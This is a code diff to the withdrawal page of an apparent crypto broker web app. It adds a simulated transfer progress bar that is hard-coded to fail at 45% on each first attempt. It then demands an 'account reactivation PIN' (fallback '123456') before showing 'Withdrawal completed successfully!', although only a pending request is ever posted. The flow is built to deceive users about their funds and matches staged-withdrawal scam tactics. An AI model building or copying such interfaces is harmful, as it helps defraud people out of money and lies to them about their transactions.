@@ -1,7 +1,10 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { motion } from 'framer-motion';
-import { FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle } from 'react-icons/fa';
+import { motion, AnimatePresence } from 'framer-motion';
+import { 
+  FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
+  FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey 
+} from 'react-icons/fa';
 import toast from 'react-hot-toast';
 import Navbar from '../components/Navbar';
 import { walletService } from '../services/walletService';
@@ -18,6 +21,22 @@ const Withdraw = () => {
   const [loading, setLoading] = useState(false);
   const [walletBalance, setWalletBalance] = useState(0);
   const [kycStatus, setKycStatus] = useState('checking');
+
+  // Transfer simulation states
+  const [showTransferModal, setShowTransferModal] = useState(false);
+  const [transferProgress, setTransferProgress] = useState(0);
+  const [transferStatus, setTransferStatus] = useState('pending'); // 'pending' | 'failed' | 'complete'
+  const [isRetry, setIsRetry] = useState(false); // to allow success on retry
+  const progressInterval = useRef(null);
+
+  // Reactivation modal states
+  const [showReactivationModal, setShowReactivationModal] = useState(false);
+  const [reactivationPin, setReactivationPin] = useState('');
+  const [pinError, setPinError] = useState('');
+  const [isVerifyingPin, setIsVerifyingPin] = useState(false);
+
+  // PIN from env or fallback
+  const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '123456';
 
   const currencySymbol = getCurrencySymbol(user?.currency);
 
@@ -48,6 +67,51 @@ const Withdraw = () => {
     fetchData();
   }, []);
 
+  // Cleanup interval
+  useEffect(() => {
+    return () => {
+      if (progressInterval.current) clearInterval(progressInterval.current);
+    };
+  }, []);
+
+  // Transfer progress simulation
+  useEffect(() => {
+    if (showTransferModal) {
+      setTransferProgress(0);
+      setTransferStatus('pending');
+      let progress = 0;
+      progressInterval.current = setInterval(() => {
+        progress += 1;
+
+        // Fail at 45% only on the first attempt (not retry)
+        if (progress >= 45 && !isRetry) {
+          clearInterval(progressInterval.current);
+          progressInterval.current = null;
+          setTransferProgress(45);
+          setTransferStatus('failed');
+          return;
+        }
+
+        if (progress >= 100) {
+          clearInterval(progressInterval.current);
+          progressInterval.current = null;
+          setTransferProgress(100);
+          setTransferStatus('complete');
+          toast.success('Withdrawal completed successfully!');
+          return;
+        }
+        setTransferProgress(progress);
+      }, 100);
+    } else {
+      if (progressInterval.current) {
+        clearInterval(progressInterval.current);
+        progressInterval.current = null;
+      }
+      setTransferProgress(0);
+      setTransferStatus('pending');
+    }
+  }, [showTransferModal, isRetry]);
+
   const cryptos = [
     { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
     { id: 'BTC', name: 'Bitcoin', icon: FaBitcoin, color: 'text-orange-500' },
@@ -66,13 +130,11 @@ const Withdraw = () => {
       return;
     }
 
-    // KYC check – toast error only, no modal
     if (kycStatus !== 'verified') {
       toast.error('KYC verification required. Please complete your KYC to withdraw.');
       return;
     }
 
-    // Balance check – toast error only, no modal
     if (amountNum > walletBalance) {
       toast.error('Insufficient balance');
       return;
@@ -83,16 +145,32 @@ const Withdraw = () => {
       return;
     }
 
-    // ✅ Submit withdrawal directly – no modals
+    // Reset retry flag on new submission
+    setIsRetry(false);
     proceedWithdrawal(amountNum);
   };
 
   const proceedWithdrawal = async (amountNum) => {
     setLoading(true);
     try {
-      const response = await API.post('/transactions', {
+      // Simulate API call first
+      await new Promise(resolve => setTimeout(resolve, 800));
+
+      // Open transfer modal — actual API submission happens when transfer completes
+      setShowTransferModal(true);
+    } catch (error) {
+      toast.error(error.response?.data?.message || 'Withdrawal failed');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // Called when transfer completes successfully
+  const finalizeWithdrawal = async () => {
+    try {
+      await API.post('/transactions', {
         type: 'withdrawal',
-        amount: amountNum,
+        amount: parseFloat(amount),
         currency: 'USD',
         description: `Withdrawal to ${crypto} wallet`,
         metadata: {
@@ -101,16 +179,52 @@ const Withdraw = () => {
         },
         status: 'pending',
       });
-
-      if (response.data.success) {
-        toast.success('Withdrawal request submitted!');
-        navigate('/transactions');
-      }
     } catch (error) {
-      toast.error(error.response?.data?.message || 'Withdrawal failed');
-    } finally {
-      setLoading(false);
+      console.error('Finalize withdrawal error:', error);
     }
+  };
+
+  // Retry button → open reactivation modal
+  const handleRetry = () => {
+    setShowTransferModal(false);
+    setShowReactivationModal(true);
+    setReactivationPin('');
+    setPinError('');
+  };
+
+  // Verify reactivation PIN
+  const handleVerifyPin = () => {
+    if (!reactivationPin.trim()) {
+      setPinError('Please enter the reactivation PIN.');
+      return;
+    }
+
+    setIsVerifyingPin(true);
+    setPinError('');
+
+    setTimeout(() => {
+      if (reactivationPin.trim() === REACTIVATION_PIN) {
+        setShowReactivationModal(false);
+        setReactivationPin('');
+        setPinError('');
+        setIsVerifyingPin(false);
+        // Mark as retry (so it completes) and reopen transfer modal
+        setIsRetry(true);
+        setShowTransferModal(true);
+        toast.success('Account reactivated. Completing transfer...');
+      } else {
+        setPinError('Invalid PIN. Please try again.');
+        setReactivationPin('');
+        setIsVerifyingPin(false);
+      }
+    }, 800);
+  };
+
+  const handleCloseSuccess = async () => {
+    setShowTransferModal(false);
+    await finalizeWithdrawal();
+    toast.success('Withdrawal request submitted!');
+    navigate('/transactions');
   };
 
   const formatCurrency = (value) => {
@@ -140,7 +254,6 @@ const Withdraw = () => {
             </div>
           </div>
 
-          {/* KYC Status Warning – toast only on submit, no modal */}
           {!isKycVerified && (
             <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-center gap-3">
               <FaLock className="text-yellow-500 text-sm" />
@@ -219,6 +332,166 @@ const Withdraw = () => {
           </form>
         </motion.div>
       </div>
+
+      {/* TRANSFER SIMULATION MODAL */}
+      <AnimatePresence>
+        {showTransferModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, y: 20 }}
+              animate={{ scale: 1, y: 0 }}
+              exit={{ scale: 0.9, y: 20 }}
+              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center"
+            >
+              {/* Status icon */}
+              <div className="flex justify-center mb-4">
+                {transferStatus === 'pending' && (
+                  <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
+                    <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                  </div>
+                )}
+                {transferStatus === 'failed' && (
+                  <div className="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center">
+                    <FaExclamationTriangle className="w-8 h-8 text-red-500" />
+                  </div>
+                )}
+                {transferStatus === 'complete' && (
+                  <div className="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center">
+                    <FaCheckCircle className="w-8 h-8 text-green-500" />
+                  </div>
+                )}
+              </div>
+
+              <h3 className="text-xl font-bold text-white mb-2">
+                {transferStatus === 'pending' && 'Processing Transfer...'}
+                {transferStatus === 'failed' && 'Transfer Failed'}
+                {transferStatus === 'complete' && 'Transfer Complete!'}
+              </h3>
+
+              <p className="text-sm text-slate-400 mb-4">
+                {transferStatus === 'pending' && 'Moving funds from broker wallet to your destination wallet.'}
+                {transferStatus === 'failed' && 'The transfer could not be completed. Please try again.'}
+                {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
+              </p>
+
+              {/* Progress bar */}
+              <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
+                <div
+                  className={`h-full rounded-full transition-all duration-300 ${
+                    transferStatus === 'failed'
+                      ? 'bg-red-500'
+                      : transferStatus === 'complete'
+                      ? 'bg-green-500'
+                      : 'bg-blue-500'
+                  }`}
+                  style={{ width: `${transferProgress}%` }}
+                />
+              </div>
+              <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>
+
+              {/* Action buttons */}
+              {transferStatus === 'failed' && (
+                <button
+                  onClick={handleRetry}
+                  className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
+                >
+                  Try Again
+                </button>
+              )}
+
+              {transferStatus === 'complete' && (
+                <button
+                  onClick={handleCloseSuccess}
+                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
+                >
+                  Done
+                </button>
+              )}
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+
+      {/* REACTIVATION MODAL */}
+      <AnimatePresence>
+        {showReactivationModal && (
+          <motion.div
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
+          >
+            <motion.div
+              initial={{ scale: 0.9, y: 20 }}
+              animate={{ scale: 1, y: 0 }}
+              exit={{ scale: 0.9, y: 20 }}
+              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
+            >
+              <div className="flex justify-center mb-4">
+                <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
+                  <FaShieldAlt className="w-8 h-8 text-yellow-500" />
+                </div>
+              </div>
+
+              <h3 className="text-xl font-bold text-white text-center mb-2">
+                Account Reactivation Required
+              </h3>
+              <p className="text-sm text-slate-400 text-center mb-4">
+                Your withdrawal limit has increased. For security reasons, please
+                reactivate your account by entering your reactivation PIN.
+              </p>
+
+              <div className="mb-4">
+                <label className="block text-slate-300 text-sm font-medium mb-2">
+                  Reactivation PIN
+                </label>
+                <div className="relative">
+                  <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
+                  <input
+                    type="password"
+                    value={reactivationPin}
+                    onChange={(e) => setReactivationPin(e.target.value)}
+                    placeholder="Enter PIN"
+                    maxLength="6"
+                    className={`w-full bg-slate-900 border ${
+                      pinError ? 'border-red-500' : 'border-slate-700'
+                    } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
+                    autoFocus
+                  />
+                </div>
+                {pinError && (
+                  <p className="text-red-400 text-xs mt-2">{pinError}</p>
+                )}
+              </div>
+
+              <div className="flex gap-3">
+                <button
+                  onClick={() => setShowReactivationModal(false)}
+                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+                >
+                  Cancel
+                </button>
+                <button
+                  onClick={handleVerifyPin}
+                  disabled={isVerifyingPin}
+                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-yellow-600 to-orange-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
+                >
+                  {isVerifyingPin ? (
+                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                  ) : (
+                    'Reactivate'
+                  )}
+                </button>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 };
